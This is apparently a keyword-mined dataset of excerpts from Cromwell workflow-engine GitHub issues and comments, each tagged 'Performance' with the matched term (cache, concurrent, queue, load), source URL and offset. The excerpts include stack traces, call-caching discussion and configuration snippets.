Performance,"Example docs:. > If neither location nor path is provided, contents must be non-null. The implementation must assign a unique identifier for the location field. When the file is staged as input to CommandLineTool, the value of contents must be written to a file. ; > ; > If loadContents of inputBinding or outputBinding is true and location is valid, the implementation must read up to the first 64 KiB of text from the file and place it in the ""contents"" field.; and. Link to specs:; - http://www.commonwl.org/v1.0/CommandLineTool.html#File; - http://www.commonwl.org/v1.0/Workflow.html#File. Example conformance test(s):. - <span>#</span>83 [v1.0/cat3-tool.cwl](https://github.com/common-workflow-language/common-workflow-language/blob/af9e073634dc6aec4092c55e1c081f335affa54a/v1.0/v1.0/cat3-tool.cwl) [v1.0/file-literal.yml](https://github.com/common-workflow-language/common-workflow-language/blob/af9e073634dc6aec4092c55e1c081f335affa54a/v1.0/v1.0/file-literal.yml); - <span>#</span>113 [v1.0/cat3-nodocker.cwl](https://github.com/common-workflow-language/common-workflow-language/blob/af9e073634dc6aec4092c55e1c081f335affa54a/v1.0/v1.0/cat3-nodocker.cwl) [v1.0/file-literal.yml](https://github.com/common-workflow-language/common-workflow-language/blob/af9e073634dc6aec4092c55e1c081f335affa54a/v1.0/v1.0/file-literal.yml)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3359:274,load,loadContents,274,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3359,1,['load'],['loadContents']
Performance,"Excellent point from @cjllanwarne: we are protected from the ""workshop scenario"" - many users validating the same WF at the same time - by the Rawls cache",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4573#issuecomment-456958477:149,cache,cache,149,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4573#issuecomment-456958477,1,['cache'],['cache']
Performance,"Excellent! Thanks for the pointer. As far as compute environment and job queue, they need to be setup in advance. @delagoya is creating a CloudFormation template that will make this relatively simple, and I believe we're planning on putting that in the 101 docs at that time.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395554332:73,queue,queue,73,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395554332,2,['queue'],['queue']
Performance,Exception: Unable to create actor for ActorRef Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor/ServiceRegistryActor/KeyValue#988818050]; at cromwell.server.CromwellRootActor$$anonfun$1.applyOrElse(CromwellRootActor.scala:81); at cromwell.server.CromwellRootActor$$anonfun$1.applyOrElse(CromwellRootActor.scala:80); at akka.actor.SupervisorStrategy.handleFailure(FaultHandling.scala:295); at akka.actor.dungeon.FaultHandling$class.handleFailure(FaultHandling.scala:263); at akka.actor.ActorCell.handleFailure(ActorCell.scala:374); at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:459); at akka.actor.ActorCell.systemInvoke(ActorCell.scala:483); at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:282); at akka.dispatch.Mailbox.run(Mailbox.scala:223); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.lang.reflect.InvocationTargetException; at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method); at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62); at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45); at java.lang.reflect.Constructor.newInstance(Constructor.java:423); at akka.util.Reflect$.instantiate(Reflect.scala:65); at akka.actor.ArgsReflectConstructor.produce(IndirectActorProducer.scala:96); at akka.actor.Props.newActor(Props.scala:213); at akka.actor.ActorCell.newActor(ActorCell.scala:562); at akka.actor.ActorCell.create(ActorCell.scala:588); at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:461); ... 8 more; Caused by: java.lang.ExceptionInInitializerError; at cromwell.services.SingletonServicesStore$cl,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1748#issuecomment-265155974:1333,concurren,concurrent,1333,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1748#issuecomment-265155974,1,['concurren'],['concurrent']
Performance,Excess load causes slick to start rejecting tasks,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2381:7,load,load,7,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2381,1,['load'],['load']
Performance,Exclude labels performance,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4601:15,perform,performance,15,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4601,1,['perform'],['performance']
Performance,Execution Store and JobPaths optimizations,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2198:29,optimiz,optimizations,29,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2198,1,['optimiz'],['optimizations']
Performance,"ExecutionActor failed and didn't catch its exception.; at cromwell.backend.standard.StandardSyncExecutionActor$$anonfun$jobFailingDecider$1.applyOrElse(StandardSyncExecutionActor.scala:147); at cromwell.backend.standard.StandardSyncExecutionActor$$anonfun$jobFailingDecider$1.applyOrElse(StandardSyncExecutionActor.scala:144); at akka.actor.SupervisorStrategy.handleFailure(FaultHandling.scala:296); at akka.actor.dungeon.FaultHandling$class.handleFailure(FaultHandling.scala:263); at akka.actor.ActorCell.handleFailure(ActorCell.scala:374); at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:459); at akka.actor.ActorCell.systemInvoke(ActorCell.scala:483); at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:282); at akka.dispatch.Mailbox.run(Mailbox.scala:223); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.lang.RuntimeException: Google credentials are invalid: 500 Internal Server Error; {; ""error"" : ""internal_failure""; }; at cromwell.filesystems.gcs.auth.GoogleAuthMode$class.validate(GoogleAuthMode.scala:66); at cromwell.filesystems.gcs.auth.GoogleAuthMode$class.validateCredential(GoogleAuthMode.scala:62); at cromwell.filesystems.gcs.auth.RefreshTokenMode.validateCredential(GoogleAuthMode.scala:127); at cromwell.filesystems.gcs.auth.RefreshTokenMode.credential(GoogleAuthMode.scala:147); at cromwell.filesystems.gcs.GcsPathBuilder.<init>(GcsPathBuilder.scala:57); at cromwell.filesystems.gcs.GcsPathBuilderFactory.withOptions(GcsPathBuilderFactory.scala:37); at cromwell.backend.impl.jes.JesWorkflowPaths.<init>(JesWorkflowPaths.scala:25); at cromwell.backend.impl.jes.JesWorkflowPaths.copy(JesWorkflowPaths.scala:19); at cromwell.bac",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2270:1606,concurren,concurrent,1606,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2270,1,['concurren'],['concurrent']
Performance,ExecutionActor.scala:111); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.cromwell$backend$impl$jes$JesAsyncBackendJobExecutionActor$$returnCodeContents(JesAsyncBackendJobExecutionActor.scala:111); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor$$anonfun$executionResult$1.apply(JesAsyncBackendJobExecutionActor.scala:549); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor$$anonfun$executionResult$1.apply(JesAsyncBackendJobExecutionActor.scala:539); at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24); at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:24); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: javax.net.ssl.SSLHandshakeException: Remote host closed connection during handshake; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:980); at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1363); at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1391); at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1375); at sun.net.www.protocol.https.HttpsClient.afterConnect(HttpsClient.java:563); at sun.net.www.protocol.https.AbstractDelegateHttpsURLConnection.connect(AbstractDelegateHttpsURLConnection.java:185); at sun.net.www.protocol.https.HttpsURLConnectionImpl.connect(HttpsURLConnectionImpl.java:153); at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:93); at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:981); a,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1782:3767,concurren,concurrent,3767,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1782,1,['concurren'],['concurrent']
Performance,"ExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:558); at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:83); at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$5.applyOrElse(StandardAsyncExecutionActor.scala:1072); at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$5.applyOrElse(StandardAsyncExecutionActor.scala:1068); at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:413); at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). 2018-07-04 07:20:37,090 cromwell-system-akka.dispatchers.engine-dispatcher-29 INFO - WorkflowManagerActor WorkflowActor-b2e34f33-e643-437f-aa38-b62f6d44f2dc is in a terminal state: WorkflowFailedState; ```. [centaur_log.txt](https://github.com/broadinstitute/cromwell/files/2163881/centaur_log.txt). Best viewed with `less -R centaur_log.txt`. The image has been there since t",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3861:2295,concurren,concurrent,2295,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3861,1,['concurren'],['concurrent']
Performance,ExecutionStore should cycle through queued elements [BA-6487 prerequisite],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5588:36,queue,queued,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5588,1,['queue'],['queued']
Performance,"Executor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(Redefined); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Redefined). ""Hikari Housekeeping Timer (pool db)"" #24 daemon prio=5 os_prio=31 tid=0x00007fb76d88f000 nid=0x7503 waiting on condition [0x000000012cebb000]; java.lang.Thread.State: TIMED_WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0623fc0> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:215); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos(AbstractQueuedSynchronizer.java:2078); at java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:1093); at java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:809); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(Redefined); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Redefined). ""cromwell-system-akka.io.pinned-dispatcher-7"" #23 prio=5 os_prio=31 tid=0x00007fb76b450800 nid=0x7303 runnable [0x000000012cdb8000]; java.lang.Thread.State: RUNNABLE; at sun.nio.ch.KQueueArrayWrapper.kevent0(Native Method); at sun.nio.ch.KQueueArrayWrapper.poll(KQueueArrayWrapper.java:198); at sun.nio.ch.KQueueSelectorImpl.doSelect(KQueueSelectorImpl.java:103); at sun.nio.ch.SelectorImpl.lockAndDoSelect(SelectorImpl.java:86); - locked <0x00000006c0612e70> (a sun.nio.ch.Util$2); - locked <0x00000006c0612e80> (a java.util.Collections$UnmodifiableSet); - locked <0x00000006c0612e20> (a sun.nio.ch.KQueueSelectorImpl); at sun.nio.ch.SelectorImpl.select(SelectorImpl.java:97); at sun.nio.ch.SelectorImpl.select(SelectorImpl.java:101); at akka.io.Selec",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:42108,concurren,concurrent,42108,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,"Executor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-18"" #93 prio=5 os_prio=0 tid=0x00007fdaa80bc800 nid=0xa54 waiting on condition [0x00007fda90777000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745); ....snip.... ""ForkJoinPool-2-worker-29"" #38 daemon prio=5 os_prio=0 tid=0x00007fdaf4001000 nid=0xa0e waiting on condition [0x00007fdb8073c000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b540500> (a scala.concurrent.forkjoin.ForkJoinPool); at scala.concurrent.forkjoin.ForkJoinPool.scan(ForkJoinPool.java:2075); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). ""db-1"" #37 daemon prio=5 os_prio=0 tid=0x00007fdaf833e800 nid=0xa0d waiting on condition [0x00007fdb80ad0000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b76aed8> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.Lo",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:2985,concurren,concurrent,2985,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['concurren'],['concurrent']
Performance,"Executor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-19"" #94 prio=5 os_prio=0 tid=0x00007fdaa80be800 nid=0xa55 waiting on condition [0x00007fda90676000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-18"" #93 prio=5 os_prio=0 tid=0x00007fdaa80bc800 nid=0xa54 waiting on condition [0x00007fda90777000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745); ....snip.... ""Fo",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:2108,concurren,concurrent,2108,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['concurren'],['concurrent']
Performance,Expose an option that can be of some limited use in increasing cache hit throughput.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2027:63,cache,cache,63,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2027,2,"['cache', 'throughput']","['cache', 'throughput']"
Performance,"Extending mcovarr's work in #6366 . Big shoutout to mcovarr!!!. [Per @mbookman]; This pull request is an initial update to address:. CROM-6718: FR: Add flag for minimizing chance of GCP cross-region network egress charges being incurred. This PR specifically focuses on the risks of egress charges incurred due to call caching. The framing of the approach here, which is a bit broader than originally noted in CROM-6718, is:; Make call caching location-aware, prioritizing copies that minimize egress charges.; Add a workflow option enabling control of what egress charges can be incurred for call cache copying.; The new workflow option would be:. call_cache_egress: [none, continental, global]. where the values affect whether call cache copies can incur egress charges:; none: only within-region copies are allowed, which generate no egress charges; continental: within content copies are allowed; within-content copies have reduced costs, such as $0.01 / GB in the US; global: copies across all regions are allowed. Cross-content egress charges can be much higher (ranging from $0.08 / GB up to $0.23 / GB). ### CURRENT STATUS OF PR:; With the changes in this PR, Cromwell successfully checks the location of the source and destination file to be copied, compares the location, and makes a decision of whether or not it should be copied based on the call_cache_egress option. If it should be copied, the files are copied as normal. If it should not be copied, the cache attempt fails and the workflow runs instead.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6369:598,cache,cache,598,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6369,6,['cache'],['cache']
Performance,"FWIW Enum support would definitely be very valuable to us in GATK-world, and are likely to be useful in general. . My one caveat would be that they should be easier to work with than they were in Queue (friendly elbow poke at @kshakir).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2425#issuecomment-325877126:196,Queue,Queue,196,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2425#issuecomment-325877126,1,['Queue'],['Queue']
Performance,"FWIW this was inspired by the conversation here: (https://gatkforums.broadinstitute.org/wdl/discussion/9031/intermediate-outputs#latest). In particular I wonder whether this might maybe help with the unfortunate interaction of ""intermediate files"" and ""call caching"". In particular it gives users something a bit bigger than a task to call cache against, so there are more options, eg; * delete all intermediates (and never call cache); * delete job outputs (but maybe I can still cache subworkflows that haven't changed); * delete no intermediates (and call cache at the finest grain)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3420#issuecomment-373493373:340,cache,cache,340,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3420#issuecomment-373493373,4,['cache'],['cache']
Performance,"FYI there's a hidden watermark at the top of the file that one can use in PRs to tell if the RESTAPI.md was manually or automatically updated. Example: https://github.com/broadinstitute/cromwell/blame/31/docs/api/RESTAPI.md#L1-L8. Also if one doesn't have a dev environment locally they can still use any public sbt docker. It will take a while as it downloads ~the entire internet~ all of the un-cached cromwell dependencies, but something like this will work:. ```shell; docker \; run \; --rm \; -v $PWD:$PWD \; -w $PWD \; hseeberger/scala-sbt \; sbt generateRestApiDocs; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3562#issuecomment-385389043:397,cache,cached,397,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3562#issuecomment-385389043,1,['cache'],['cached']
Performance,Failed to copy gs://dsde-palantir/SnapshotExperiment2015/CEUTrio/gvcfs/NA12878.d691bf66-37af-4375-9c09-6a6607f322e8.g.vcf.gz to gs://broad-dsde-methods/cromwell-execution-25/GenotypeGVCFsComparison/c5bc4f99-d969-49ca-9e2e-a3dac7a4b12a/call-IndexVCF/dsde-palantir/SnapshotExperiment2015/CEUTrio/gvcfs/NA12878.d691bf66-37af-4375-9c09-6a6607f322e8.g.vcf.gz; 	at cromwell.core.path.PathCopier$$anonfun$copy$2.applyOrElse(PathCopier.scala:49); 	at cromwell.core.path.PathCopier$$anonfun$copy$2.applyOrElse(PathCopier.scala:48); 	at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:36); 	at scala.util.Failure.recoverWith(Try.scala:203); 	at cromwell.core.path.PathCopier$.copy(PathCopier.scala:48); 	at cromwell.backend.standard.StandardCacheHitCopyingActor.duplicate(StandardCacheHitCopyingActor.scala:36); 	at cromwell.backend.callcaching.CacheHitDuplicating$$anonfun$copySimpletons$1.apply(CacheHitDuplicating.scala:66); 	at cromwell.backend.callcaching.CacheHitDuplicating$$anonfun$copySimpletons$1.apply(CacheHitDuplicating.scala:62); 	at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:234); 	at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:234); 	at scala.collection.Iterator$class.foreach(Iterator.scala:893); 	at scala.collection.AbstractIterator.foreach(Iterator.scala:1336); 	at scala.collection.IterableLike$class.foreach(IterableLike.scala:72); 	at scala.collection.AbstractIterable.foreach(Iterable.scala:54); 	at scala.collection.TraversableLike$class.map(TraversableLike.scala:234); 	at scala.collection.AbstractTraversable.map(Traversable.scala:104); 	at cromwell.backend.callcaching.CacheHitDuplicating$class.copySimpletons(CacheHitDuplicating.scala:62); 	at cromwell.backend.callcaching.CacheHitDuplicating$class.copyCachedOutputs(CacheHitDuplicating.scala:92); 	at cromwell.backend.standard.StandardCacheHitCopyingActor.copyCachedOutputs(StandardCacheHitCopyingActor.scala:33); 	at cromwell.backend.Ba,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2229:1311,Cache,CacheHitDuplicating,1311,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2229,1,['Cache'],['CacheHitDuplicating']
Performance,"Failure writing to call cache, right truncation",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3607:24,cache,cache,24,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3607,1,['cache'],['cache']
Performance,Fewer execution event entries during call cache cycles [BA-5843],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5119:42,cache,cache,42,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5119,1,['cache'],['cache']
Performance,"Figured out the issue thanks to @cjllanwarne as I actually needed to run the following instead:; ```; wget https://raw.githubusercontent.com/broadinstitute/cromwell/develop/cromwell.example.backends/cromwell.examples.conf; sed -i 's/#default = ""LocalExample""/default = ""LocalExample""/' cromwell.examples.conf; sed -i 's/#concurrent-job-limit = 5/concurrent-job-limit = 5/' cromwell.examples.conf; java -Dconfig.file=cromwell.examples.conf -jar cromwell-51.jar run ...; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5359#issuecomment-649838138:321,concurren,concurrent-job-limit,321,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5359#issuecomment-649838138,2,['concurren'],['concurrent-job-limit']
Performance,"File""; ],; ""doc"": ""Optional - configuration file use to override default GRIDSS settings.\n"",; ""inputBinding"": {; ""prefix"": ""--configuration""; },; ""id"": ""#gridss-2.9.4.cwl/configuration""; },; {; ""type"": [; ""null"",; ""boolean""; ],; ""doc"": ""Optional - use the system version of bwa instead of the in-process version packaged with GRIDSS\n"",; ""inputBinding"": {; ""prefix"": ""--externalaligner""; },; ""default"": false,; ""id"": ""#gridss-2.9.4.cwl/externalaligner""; },; {; ""type"": [; ""null"",; ""string""; ],; ""doc"": ""Optional - location of GRIDSS jar\n"",; ""inputBinding"": {; ""prefix"": ""--jar""; },; ""default"": ""/opt/gridss/gridss-2.9.4-gridss-jar-with-dependencies.jar"",; ""id"": ""#gridss-2.9.4.cwl/jar""; },; {; ""type"": ""boolean"",; ""doc"": ""zero-based assembly job index (only required when performing parallel assembly across multiple computers)\n"",; ""inputBinding"": {; ""prefix"": ""--jobindex""; },; ""default"": false,; ""id"": ""#gridss-2.9.4.cwl/jobindex""; },; {; ""type"": ""boolean"",; ""doc"": ""total number of assembly jobs (only required when performing parallel assembly across multiple computers). Note than an assembly jobs is required after all indexed jobs have been completed to gather the output files together.\n"",; ""inputBinding"": {; ""prefix"": ""--jobnodes""; },; ""default"": false,; ""id"": ""#gridss-2.9.4.cwl/jobnodes""; },; {; ""type"": [; ""null"",; ""string""; ],; ""doc"": ""size of JVM heap for assembly and variant calling.\n"",; ""inputBinding"": {; ""prefix"": ""--jvmheap""; },; ""default"": ""$(get_max_memory_from_runtime_memory(runtime.ram))m"",; ""id"": ""#gridss-2.9.4.cwl/jvmheap""; },; {; ""type"": ""boolean"",; ""doc"": ""keep intermediate files. Not recommended except for debugging due to the high disk usage.\n"",; ""inputBinding"": {; ""prefix"": ""--keepTempFiles""; },; ""default"": false,; ""id"": ""#gridss-2.9.4.cwl/keepTempFiles""; },; {; ""type"": [; ""null"",; ""string""; ],; ""doc"": ""comma separated labels to use in the output VCF for the input files.\nSupporting read counts for input files with the same label are aggregated\n(usefu",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5826:12314,perform,performing,12314,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5826,1,['perform'],['performing']
